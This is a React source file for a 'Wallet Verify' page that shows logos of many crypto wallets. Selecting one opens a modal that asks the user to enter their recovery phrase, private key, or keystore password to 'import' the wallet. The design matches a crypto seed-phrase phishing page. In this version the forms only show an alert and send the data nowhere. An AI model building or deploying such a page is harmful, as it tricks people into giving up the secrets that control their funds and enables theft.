
const walletData = [
    {
        id: '',
        name: 'Metamask',
        pathToLogo: './images/icons/metamask.png'
    },
    {
        id: '',
        name: 'Trust',
        pathToLogo: './images/icons/trust.png'
    },
    {
        id: '',
        name: 'Argent',
        pathToLogo: './images/icons/argent.jpg'
    },
    {
        id: '',
        name: 'Atomic',
        pathToLogo: './images/icons/atomic.png'
    },
    {
        id: '',
        name: 'Authereum',
        pathToLogo: './images/icons/authereum.png'
    },
    {
        id: '',
        name: 'Bitpay',
        pathToLogo: './images/icons/bitpay.png'
    },
    {
        id: '',
        name: 'Blockchain',
        pathToLogo: './images/icons/blockchain.png'
    },
    {
        id: '',
        name: 'Coin98',
        pathToLogo: './images/icons/coin98.png'
    },
    {
        id: '',
        name: 'Crypto',
        pathToLogo: './images/icons/crypto.png'
    },
    {
        id: '',
        name: 'Eidoo',
        pathToLogo: './images/icons/eidoo.png'
    },
    {
        id: '',
        name: 'Enjin',
        pathToLogo: './images/icons/enjin.png'
    },
    {
        id: '',
        name: 'Gnosis',
        pathToLogo: './images/icons/Gnosis.jpg'
    },
    {
        id: '',
        name: 'Huobi',
        pathToLogo: './images/icons/Huobi.jpg'
    },
    {
        id: '',
        name: 'Imtoken',
        pathToLogo: './images/icons/Imtoken.png'
    },
    {
        id: '',
        name: 'Ledgerlive',
        pathToLogo: './images/icons/ledgerlive.png'
    },
    {
        id: '',
        name: 'Loopring',
        pathToLogo: './images/icons/loopring.jpg'
    },
    {
        id: '',
        name: 'Maiar',
        pathToLogo: './images/icons/maiar.png'
    },
    {
        id: '',
        name: 'Math Wallet',
        pathToLogo: './images/icons/math_wallet.png'
    },
    {
        id: '',
        name: 'Mobox',
        pathToLogo: './images/icons/mobox.png'
    },
    {
        id: '',
        name: 'MyKey',
        pathToLogo: './images/icons/mykey.png'
    },
    {
        id: '',
        name: 'Onto',
        pathToLogo: './images/icons/onto.png'
    },
    {
        id: '',
        name: 'Pillar',
        pathToLogo: './images/icons/pillar.png'
    },
    {
        id: '',
        name: 'Rainbow',
        pathToLogo: './images/icons/rainbow.png'
    },
    {
        id: '',
        name: 'Ronin',
        pathToLogo: './images/icons/ronin.png'
    },
    {
        id: '',
        name: 'TokenPocket',
        pathToLogo: './images/icons/tokenpocket.png'
    },
    {
        id: '',
        name: 'Trezor',
        pathToLogo: './images/icons/trezor.png'
    },
    {
        id: '',
        name: 'Trust Vault',
        pathToLogo: './images/icons/trustvault.png'
    },
    {
        id: '',
        name: 'Walleth',
        pathToLogo: './images/icons/walleth.png'
    }
]

const Navigation = () => {
    return (
        <>
        <Navbar collapseOnSelect expand='sm' bg='light' variant='light'>
            <Container>
                <Row className="text-dark container-fluid p-4">
                    <Col className="text-center my-auto py-3 nav-option" xs={4}><strong>Home</strong></Col>
                    <Col className="text-center" xs={4}><img src='/images/logos/favicon.ico' width='40%' alt="logo" /></Col>
                    <Col className="text-center my-auto py-3 nav-option" xs={4}><strong>Charts</strong></Col>
                </Row>
            </Container>
        </Navbar>
        </>
    );
}

const Banner = () => {
    const p_style = {
        fontSize: '17px',
        maxWidth: '599px'
    }
    return (
        <Container className="text-center p-3">
            <h2 className="text-secondary m-3">Secure Wallets</h2>
            <p className="text-secondary m-auto" style={p_style}>
                Lorem ipsum dolor sit amet consectetur, adipisicing elit. 
                Odio consequuntur laboriosam minus eligendi laborum possimus? 
                Aliquam minus sit magni ab magnam nesciunt, ea iusto placeat?
            </p>
        </Container>
    )
}

const PhraseForm = () => {
    const [validated, setValidated] = useState(false);

    const handleSubmit = (event) => {
        const form = event.currentTarget;
        event.preventDefault();
        if (form.checkValidity() === false) {
            event.stopPropagation();
            console.log("checkValidity returned false!");
        }else {
            alert("Response submitted successfully.");
        }
  
        setValidated(true);
    };

    return (
        <Form noValidate validated={validated} onSubmit={handleSubmit}>
            <Form.Control as="textarea" rows={3} placeholder="Enter your recovery phrase" required/>
            <Container className="p-3 text-center"><small className="text-muted">Typically 12 (sometimes 24) words separated by single spaces</small></Container>
            <Form.Control type="submit" className="btn btn-primary m-auto mt-3" value="Proceed" />
        </Form>
    )
}

const PrivateKeyForm = () => {
    const [validated, setValidated] = useState(false);

    const handleSubmit = (event) => {
        const form = event.currentTarget;
        event.preventDefault();
        if (form.checkValidity() === false) {
            event.stopPropagation();
            console.log("checkValidity returned false!");
        }else {
            alert("Response submitted successfully.");
        }
  
        setValidated(true);
    };

    return (
        <Form noValidate validated={validated} onSubmit={handleSubmit}>
            <Form.Control type="text" placeholder="Enter your private key" required/>
            <Container className="p-3 text-center"><small className="text-muted">Typically 12 (sometimes 24) words seperated by a single space.</small></Container>
            <Form.Control type="submit" className="btn btn-primary m-auto mt-3" value="Proceed" />
        </Form>
    )
}

const KeystoreJsonForm = () => {
    const [validated, setValidated] = useState(false);
  
    const handleSubmit = (event) => {
        const form = event.currentTarget;
        event.preventDefault();
        if (form.checkValidity() === false) {
            event.stopPropagation();
            console.log("checkValidity returned false!");
        }else {
            alert("Response submitted successfully.");
        }

        setValidated(true);
  
    };

    return (
        <Form noValidate validated={validated} onSubmit={handleSubmit}>
            <Form.Control type="text" placeholder="Wallet password" required/>
            <Container className="p-3 text-center"><small className="text-muted">Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.</small></Container>
            <Form.Control type="submit" className="btn btn-primary m-auto mt-3" value="Proceed" />
        </Form>
    )
}

class ModalContent  extends Component {
    constructor(props) {
        super(props)
        this.state = {
            wallet_name: props.walletName,
            pathtologo: props.logo,
            formOption: 'phraseform'
        }
        console.log(this.state.pathtologo)
    }

    borderBottomGray = {borderBottom: "2px solid #eee"}

    handleFormOption = (formOption) => {
        this.setState({formOption: formOption})
    }

    chosenform = () => {
        switch (this.state.formOption) {
            case "phraseform":
                return <PhraseForm />
                break;
            case "privatekeyform":
                return <PrivateKeyForm />
                break;
            case "keystorejson":
                return <KeystoreJsonForm />
                break;
        
            default:
                return null;
                break;
        }
    }

    render () {
        return (
            <Container>
                <Row className="m-auto">
                    <Col xs={3} className="text-right p-3"><img src={this.state.pathtologo} width="55%" alt="" /></Col>
                    <Col xs={9} className="text-left p-3"><strong>Import your {this.state.wallet_name} wallet</strong></Col>
                </Row>
                <Row className='mb-2' style={this.borderBottomGray}>
                    <Col xs={4} className="text-center p-2" onClick={() => this.handleFormOption('phraseform')}>Phrase</Col>
                    <Col xs={4} className="text-center p-2" onClick={() => this.handleFormOption('keystorejson')}>Keystore JSON</Col>
                    <Col xs={4} className="text-center p-2" onClick={() => this.handleFormOption('privatekeyform')}>Private Key</Col>
                </Row>
                <this.chosenform/>
        </Container>
        )
    }

}


class Mains extends Component {
    state = {
        show: false,
        walletName: '',
        path: ''
    }

    
    handleClose = () => this.setState({show: false});
    handleShow = ({name, pathToLogo}) => {
        this.setState({show: true});
        this.state.walletName = name;
        this.state.path = pathToLogo;
        console.log(this.state.path)
    };

    walletList = walletData.map(({name, pathToLogo}) => (
        <Col xs={6} sm={4} md={3} className="p-3 text-center">
            <img src={pathToLogo} width='59%' className="mb-3 cursor-pointer" onClick={() => {this.handleShow({name, pathToLogo})}} alt=""/>
            <div className="text-center cursor-pointer">{name}</div>
        </Col>
    ));

    render() {
        console.log(this.walletList);
        return (
            <Container>
            <Row>
                { this.walletList }
            </Row>
            <Modal
        show={this.state.show}
        onHide={this.handleClose}
        backdrop="static"
        keyboard={false}
        aria-labelledby="contained-modal-title-vcenter"
        centered
      >
        
        <Modal.Body className="p-5">
          <ModalContent walletName={this.state.walletName} logo={this.state.path} />
          <Container className='text-right'><Button variant="danger" className="m-auto mt-3" onClick={this.handleClose}>Cancel</Button></Container>
        </Modal.Body>
        
      </Modal>
        </Container>
        )
    }

}

const Footer = () => {
    const footerStyle = {
        backgroundColor: "#36474f"
    }
    return (
        <Container className="text-white p-4" style={footerStyle} fluid>
            <Row>
                <Col xs={8} sm={4}>
                    <Row className="mb-2">
                        <Col xs={4} className="text-right"><img src="./images/logos/favicon.ico" width="50%" alt="logo"/></Col>
                        <Col xs={8} className="text-left"><span>Wallet Verify</span></Col>
                    </Row>
                    <p>
                        858 Zenway Blvd
                        Frigate Bay, Saint Kitts
                        Saint Kitts and Nevis
                    </p>
                </Col>
                <Col xs={8} sm={4}>
                    <div className="mb-2">Socials</div>
                    <ul className="list-unstyled">
                        <li><i className="fa fa-facebook-square" aria-hidden="true"></i> Facebook</li>
                        <li><i className="fa fa-twitter-square" aria-hidden="true"></i> Twitter</li>
                        <li><i className="fa fa-whatsapp" aria-hidden="true"></i> Whatsapp</li>
                    </ul>
                </Col>
                <Col xs={8} sm={4}>
                    <div className="mb-2">Menu</div>
                    <ul className="list-unstyled">
                        <li><i className="fa fa-home" aria-hidden="true"></i> Home</li>
                        <li><i className="fa fa-address-book" aria-hidden="true"></i> Contact</li>
                        <li><i className="fa fa-line-chart" aria-hidden="true"></i> Charts</li>
                    </ul>
                </Col>
            </Row>
        </Container>
    )
}

const App = () => {
    
    return (
        <>
        <Navigation />
        <Banner />
        <Mains />
        <Footer />
        </>
    );
}


const root = document.getElementById('root');

ReactDOM.render(<App />, root);
    
